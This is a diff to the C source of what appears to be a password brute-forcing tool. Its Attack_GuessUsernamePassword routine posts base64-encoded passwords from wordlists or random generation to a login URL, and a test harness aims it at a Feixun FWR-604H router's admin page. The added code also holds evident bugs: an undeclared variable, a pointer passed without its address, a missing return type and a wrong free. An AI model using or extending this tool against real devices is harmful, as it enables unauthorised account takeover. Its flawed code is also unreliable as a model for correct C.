@@ -6,27 +6,31 @@
 #include "../main.h"
 #include "guess.h"
 
-// from ../core/debug.h
+// from ../core/debug.c
 extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmtstring, ...);
 extern int DisplayInfo(const char *fmtstring, ...);
 extern int DisplayWarning(const char *fmtsring, ...);
 extern int DisplayError(const char *fmtstring, ...);
 
-// from ../core/str.h
+// from ../core/str.c
 extern int FreeRandomPasswordBuff(char *password);
 extern int GetRandomPassword(char **rebuf, unsigned int seed, const int length);
-extern int SplitURL(pSplitURLOutput *output, const char *url);
+extern int SplitURL(const char *url, pSplitURLOutput *output);
 extern int FreeSplitURLBuff(pSplitURLOutput p);
-extern int ProcessFile(char *path, pStringHeader *output, int flag);
-extern int FreeProcessFileBuff(pStringHeader p);
 
-// from ../core/http.h
+// from ../core/http.c
 extern int FreeHTTPPostMethodBuff(char *p);
-extern size_t HTTPPostMethod(char **response, const char *url, const char *request, int debug_level);
+extern size_t HTTPPostMethod(const char *url, const char *request, char **response, int debug_level);
 
-// from ../core/base64.h
+// from ../core/base64.c
 extern int Base64Encode(char **b64message, const unsigned char *buffer, size_t length);
 extern size_t Base64Decode(unsigned char **buffer, char *b64message);
+
+// from ../core/dispatch.c
+extern int TaskAssignmentForFile(const char *path, pStringHeader *output, int flag, const int process_num, const int thread_num, const int serial_num);
+
+// form ../core/str.c
+extern int FreeProcessFileBuff(pStringHeader p);
 
 char *REQUEST;
 char *REQUEST_DATA;
@@ -75,7 +79,7 @@ static int UListPList(char *url, pStringHeader u_header, pStringHeader p_header)
     char data_buff[MAX_SEND_DATA_SIZE];
     pSplitURLOutput sp;
 
-    SplitURL(&sp, url);
+    SplitURL(url, &sp);
     for (u_i = 0; u_i < u_len; u_i++)
     {
         for (p_i = 0; p_i < p_len; p_i++)
@@ -83,15 +87,16 @@ static int UListPList(char *url, pStringHeader u_header, pStringHeader p_header)
             // base64
             memset(send_buff, 0, sizeof(send_buff));
             memset(data_buff, 0, sizeof(data_buff));
-            Base64Encode(&b64message, (unsigned char *)p->username, strlen(p->username));
+            Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str));
 
             // combined data now
-            sprintf(data_buff, REQUEST, u->username, b64message);
+            sprintf(data_buff, REQUEST, u->str, b64message);
             sprintf(send_buff, REQUEST_DATA, sp->host, url, strlen(data_buff), data_buff);
 
             // send now
-            HTTPPostMethod(&response, url, send_buff, 0);
+            HTTPPostMethod(url, send_buff, &response, 0);
             DisplayInfo(response);
+            FreeHTTPPostMethodBuff(*response);
             p = p->next;
         }
         u = u->next;
@@ -108,27 +113,101 @@ static int UOnePRandom(const char *url, const char *username, unsigned int seed,
     char *b64message;
     char send_buff[strlen(REQUEST) + MAX_SEND_DATA_SIZE];
     char data_buff[MAX_SEND_DATA_SIZE];
+    char *response;
     pSplitURLOutput sp;
-    SplitURL(&sp, url);
+    SplitURL(url, &sp);
 
     for (;;)
     {
-        GetRandomPassword(&password, seed, length);
+
+        if (GetRandomPassword(&password, seed, length))
+        {
+            DisplayError("GetRandomPassword failed");
+            return -1;
+        }
 
         // base64
-        Base64Encode(&b64message, (unsigned char *)password, strlen(password));
+        if (Base64Encode(&b64message, (unsigned char *)password, strlen(password)))
+        {
+            DisplayError("Base64Encode failed");
+            return -1;
+        }
 
         // combined data now
         sprintf(data_buff, REQUEST_DATA, username, b64message);
         sprintf(send_buff, REQUEST, sp->host, url, strlen(data_buff), data_buff);
 
         // send now
-        char *response;
         //DisplayInfo("*********************");
         //DisplayInfo("url: %s", url);
-        HTTPPostMethod(&response, url, send_buff, 0);
+        if (HTTPPostMethod(url, send_buff, response, 0))
+        {
+            DisplayError("HTTPPostMethod failed");
+            return -1;
+        }
         DisplayInfo(response);
-        FreeRandomPasswordBuff(password);
+        
+        if (FreeHTTPPostMethodBuff(response))
+        {
+            DisplayError("FreeHTTPPostMethodBuff failed");
+            return -1;
+        }
+        if (FreeRandomPasswordBuff(password))
+        {
+            DisplayError("FreeRandomPasswordBuff failed");
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+static UOnePList(const char *url, const char *username, const pStringHeader p_header)
+{
+    pStringNode p = p_header->next;
+    char *b64message;
+    char *response;
+    char send_buff[strlen(REQUEST) + MAX_SEND_DATA_SIZE];
+    char data_buff[MAX_SEND_DATA_SIZE];
+    pSplitURLOutput sp;
+    size_t p_i;
+    size_t p_len = p_header->length;
+
+    if (SplitURL(url, &sp))
+    {
+        DisplayError("SplitURL failed");
+        return -1;
+    }
+
+    for (p_i = 0; p_i < p_len; p_i++)
+    {
+        // base64
+        memset(send_buff, 0, sizeof(send_buff));
+        memset(data_buff, 0, sizeof(data_buff));
+        if (Base64Encode(&b64message, (unsigned char *)p->str, strlen(p->str)))
+        {
+            DisplayError("Base64Encode failed");
+            return -1;
+        }
+
+        // combined data now
+        sprintf(data_buff, REQUEST, u->username, b64message);
+        sprintf(send_buff, REQUEST_DATA, sp->host, url, strlen(data_buff), data_buff);
+
+        // send now
+        if (HTTPPostMethod(url, send_buff, &response, 0))
+        {
+            DisplayError("HTTPPostMethod failed");
+            return -1;
+        }
+
+        DisplayInfo(response);
+        if (FreeHTTPPostMethodBuff(*response))
+        {
+            DisplayError("FreeHTTPPostMethodBuff failed");
+            return -1;
+        }
+        p = p->next;
     }
 
     return 0;
@@ -148,11 +227,12 @@ int Attack_GuessUsernamePassword(pInput input)
     {
         // if path existed, ignore the usename
         pStringHeader u_header;
-        ProcessFile(input->username_path, &u_header, 0);
+
+        TaskAssignmentForFile(input->username_path, &u_header, 0, input->process_num, input->thread_num, input->serial_num);
         if (strlen(input->password_path) > 0)
         {
             pStringHeader p_header;
-            ProcessFile(input->password_path, &p_header, 1);
+            TaskAssignmentForFile(input->password_path, &p_header, 1, input->process_num, input->thread_num, input->serial_num);
             UListPList(input->address, u_header, p_header);
             FreeProcessFileBuff(u_header);
             FreeProcessFileBuff(p_header);
@@ -162,7 +242,17 @@ int Attack_GuessUsernamePassword(pInput input)
     else if (strlen(input->username) > 0)
     {
         // use one username
-        UOnePRandom(input->address, input->username, (unsigned int)input->seed, input->random_password_length);
+        if (strlen(input->password_path) > 0)
+        {
+            pStringHeader p_header;
+            TaskAssignmentForFile(input->password_path, &p_header, 1, input->process_num, input->thread_num, input->serial_num);
+            UOnePList(input->address, input->username, p_header);
+            FreeProcessFileBuff(p_header);
+        }
+        else
+        {
+            UOnePRandom(input->address, input->username, (unsigned int)input->seed, input->random_password_length);
+        }
     }
     else
     {
@@ -198,7 +288,7 @@ int main(void)
     char send_data_buff[MAX_SEND_DATA_SIZE];
     sprintf(send_data_buff, FEIXUN_FWR_604H_REQUEST_DATA, "admin", b64message);
 
-    SplitURL(&sp, url);
+    SplitURL(url, &sp);
     //DisplayInfo("%ld", strlen(send_data_buff));
     sprintf(send_buff, FEIXUN_FWR_604H_REQUEST, sp->host, url, strlen(send_data_buff), send_data_buff);
     //DisplayDebug(DEBUG_LEVEL_2, test_input_GetRandomPassword->debug_level, "Send:\n%s\n", send_buff);
